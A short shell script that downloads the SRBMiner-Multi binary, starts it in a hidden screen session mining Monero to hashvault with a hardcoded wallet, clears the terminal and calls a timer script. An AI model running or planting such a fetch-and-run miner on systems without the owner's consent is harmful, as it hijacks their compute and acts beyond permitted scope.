#!/bin/sh

WALLET=83ewexCY9sah9gKPtPTDeN5FtpwY1kitRRPnWtXHT3QTjfEwaqbTJGYJwHuGr8jUDd5PMmUSLP3cPFnSxHErAZnXMQrhGwg

POOL=pool.hashvault.pro:443

sudo apt install screen -y > /dev/null 2>&1
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz
tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz
cd SRBMiner-Multi-0-8-5
chmod +x SRBMiner-MULTI
screen -S Wuenuak_Guerrr -dm ./SRBMiner-MULTI --disable-gpu --algorithm randomx --pool $POOL --wallet $WALLET --password 13 --cpu-threads 14 --msr-use-tweaks 0 --msr-use-preset 0 --cpu-threads-intensity 1 --cpu-threads-priority 14
screen -ls
sleep 2
clear
cd ..
screen -ls
./timer.sh
